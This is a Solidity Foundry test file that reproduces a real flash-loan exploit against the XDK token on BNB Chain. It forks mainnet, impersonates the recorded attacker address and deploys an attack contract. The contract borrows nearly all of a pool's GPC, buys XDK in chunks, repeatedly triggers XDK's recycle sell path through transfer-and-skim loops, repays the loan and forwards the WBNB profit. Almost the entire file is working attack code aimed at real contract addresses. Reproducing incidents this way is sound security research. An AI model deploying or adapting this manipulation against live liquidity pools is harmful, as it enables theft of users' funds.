// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 6.84 WBNB
// Attacker : 0xb180ef1bf6fb3e9a0b5db4460e4db804e946cc8a
// Attack Contract : 0x1e7e4e41defde022e78add6f6e406a7520b63c70
// Vulnerable Contract : 0x02739be625f7a1cb196f42dceee630c394dd9faa
// Attack Tx : https://bscscan.com/tx/0x4848bae0fe22f781a94b4613596e7640f70d443db03b6a18fdaffcd30de718d0

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x02739be625f7a1cb196f42dceee630c394dd9faa#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2024163654631882916
//
// XDK's sell path moves XDK directly out of its Pancake pair and syncs the pair.
// The attacker flash-borrowed GPC, bought XDK in 10% reserve chunks, repeatedly
// triggered the recycle path, sold remaining XDK back for GPC, repaid the flash
// swap, then converted the remaining GPC to WBNB.

address constant ATTACKER = 0xB180eF1bF6FB3e9A0b5dB4460e4DB804e946cC8a;
address constant XDK = 0x02739BE625f7A1Cb196F42dceEe630C394DD9FAA;
address constant GPC = 0xD3c304697f63B279cd314F92c19cDBE5E5b1631A;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant XDK_GPC_PAIR = 0xe3cBa5C0A8efAeDce84751aF2EFDdCf071D311a9;
address constant WBNB_GPC_PAIR = 0x12dAbFCe08eF59c24cdee6c488E05179Fb8D64D9;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

interface IXDK is IERC20 {
    function recycleColdTime() external view returns (uint40);
    function lastRecycleTime() external view returns (uint256);
    function thisRecycleMaxBalance() external view returns (uint256);
    function thisRecycleBalance() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 81_556_795;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = WBNB_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(XDK, "XDK");
        vm.label(GPC, "GPC");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(XDK_GPC_PAIR, "Pancake XDK/GPC Pair");
        vm.label(WBNB_GPC_PAIR, "Pancake WBNB/GPC Pair");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = IERC20(WBNB_TOKEN).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER);
        XDKRecycleAttack attack = new XDKRecycleAttack(ATTACKER);
        attack.attack();
        vm.stopPrank();

        uint256 profit = IERC20(WBNB_TOKEN).balanceOf(ATTACKER) - beforeBalance;
        assertGt(profit, 6 ether);
    }
}

contract XDKRecycleAttack is IPancakeCallee {
    IXDK private constant xdk = IXDK(XDK);
    IERC20 private constant gpc = IERC20(GPC);
    IERC20 private constant wbnb = IERC20(WBNB_TOKEN);
    IPancakePair private constant xdkGpcPair = IPancakePair(XDK_GPC_PAIR);
    IPancakePair private constant flashPair = IPancakePair(WBNB_GPC_PAIR);
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));

    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
        gpc.approve(PANCAKE_ROUTER, type(uint256).max);
        xdk.approve(PANCAKE_ROUTER, type(uint256).max);
    }

    function attack() external {
        (, uint112 gpcReserve,) = flashPair.getReserves();
        uint256 borrowAmount = (uint256(gpcReserve) * 99) / 100;

        // step 1: borrow nearly all GPC from the WBNB/GPC pair.
        flashPair.swap(0, borrowAmount, address(this), abi.encode(borrowAmount));

        // step 5: convert post-repayment GPC surplus to WBNB and forward profit.
        uint256 gpcProfit = gpc.balanceOf(address(this));
        if (gpcProfit > 0) {
            address[] memory path = new address[](2);
            path[0] = GPC;
            path[1] = WBNB_TOKEN;
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                gpcProfit, 0, path, address(this), block.timestamp
            );
        }

        uint256 wbnbProfit = wbnb.balanceOf(address(this));
        if (wbnbProfit > 0) {
            wbnb.transfer(profitReceiver, wbnbProfit);
        }
    }

    function pancakeCall(address sender, uint256, uint256 amount1, bytes calldata data) external override {
        require(msg.sender == WBNB_GPC_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        uint256 borrowed = abi.decode(data, (uint256));
        require(amount1 == borrowed, "unexpected amount");

        // step 2: if the recycle window is stale, trigger one small sell to reset it.
        if (block.timestamp > xdk.lastRecycleTime() + xdk.recycleColdTime()) {
            primeRecycleWindow();
        }

        // step 3: spend borrowed GPC buying XDK from the manipulated pair.
        buyXdkWithGpcUntilSpent();

        // step 4: sell XDK through XDK's recycle path, then sell the leftovers for GPC.
        sellXdkIntoRecycleWindow();
        sellRemainingXdkForGpc();

        uint256 repayAmount = (borrowed * 10_000) / 9_975 + 1;
        gpc.transfer(WBNB_GPC_PAIR, repayAmount);
    }

    function primeRecycleWindow() private {
        gpc.transfer(XDK_GPC_PAIR, 1 ether);

        (uint112 reserveXdk, uint112 reserveGpc,) = xdkGpcPair.getReserves();
        uint256 amountIn = gpc.balanceOf(XDK_GPC_PAIR) - uint256(reserveGpc);
        uint256 amountOut = getAmountOut(amountIn, reserveGpc, reserveXdk);
        if (amountOut > 0) {
            xdkGpcPair.swap(amountOut, 0, address(this), "");
        }

        uint256 xdkBalance = xdk.balanceOf(address(this));
        if (xdkBalance > 0) {
            xdk.transfer(XDK_GPC_PAIR, xdkBalance);
            xdkGpcPair.skim(address(this));
        }
    }

    function buyXdkWithGpcUntilSpent() private {
        for (uint256 i = 0; i < 20; i++) {
            uint256 balance = gpc.balanceOf(address(this));
            if (balance == 0) break;

            (uint112 reserveXdk, uint112 reserveGpc,) = xdkGpcPair.getReserves();
            uint256 targetOut = cappedTenth(reserveXdk);
            uint256 amountIn = getAmountIn(targetOut, reserveGpc, reserveXdk);
            if (amountIn > balance) amountIn = balance;

            gpc.transfer(XDK_GPC_PAIR, amountIn);
            uint256 actualIn = gpc.balanceOf(XDK_GPC_PAIR) - uint256(reserveGpc);
            uint256 amountOut = getAmountOut(actualIn, reserveGpc, reserveXdk);
            if (amountOut == 0) break;

            xdkGpcPair.swap(amountOut, 0, address(this), "");
        }
    }

    function sellXdkIntoRecycleWindow() private {
        for (uint256 i = 0; i < 55; i++) {
            if (xdk.thisRecycleBalance() >= xdk.thisRecycleMaxBalance()) break;
            uint256 xdkBalance = xdk.balanceOf(address(this));
            if (xdkBalance == 0) break;

            (uint112 reserveXdk,,) = xdkGpcPair.getReserves();
            uint256 amountIn = min(xdkBalance, cappedTenth(reserveXdk));
            if (amountIn == 0) break;

            xdk.transfer(XDK_GPC_PAIR, amountIn);
            xdkGpcPair.skim(address(this));
        }
    }

    function sellRemainingXdkForGpc() private {
        for (uint256 i = 0; i < 27; i++) {
            uint256 xdkBalance = xdk.balanceOf(address(this));
            if (xdkBalance == 0) break;

            (uint112 reserveXdk,,) = xdkGpcPair.getReserves();
            uint256 amountIn = min(xdkBalance, cappedTenth(reserveXdk));
            if (amountIn == 0) break;

            xdk.transfer(XDK_GPC_PAIR, amountIn);

            uint112 reserveGpc;
            (reserveXdk, reserveGpc,) = xdkGpcPair.getReserves();
            uint256 actualIn = xdk.balanceOf(XDK_GPC_PAIR) - uint256(reserveXdk);
            uint256 amountOut = getAmountOut(actualIn, reserveXdk, reserveGpc);
            if (amountOut == 0) {
                xdkGpcPair.skim(address(this));
                break;
            }

            xdkGpcPair.swap(0, amountOut, address(this), "");
        }
    }

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) private pure returns (uint256) {
        if (amountIn == 0) return 0;
        uint256 amountInWithFee = amountIn * 9_975;
        return (amountInWithFee * reserveOut) / ((reserveIn * 10_000) + amountInWithFee);
    }

    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) private pure returns (uint256) {
        uint256 numerator = reserveIn * amountOut * 10_000;
        uint256 denominator = (reserveOut - amountOut) * 9_975;
        return (numerator / denominator) + 1;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function cappedTenth(uint256 reserveXdk) private pure returns (uint256) {
        uint256 cap = reserveXdk / 10;
        return cap == 0 ? 0 : cap - 1;
    }
}
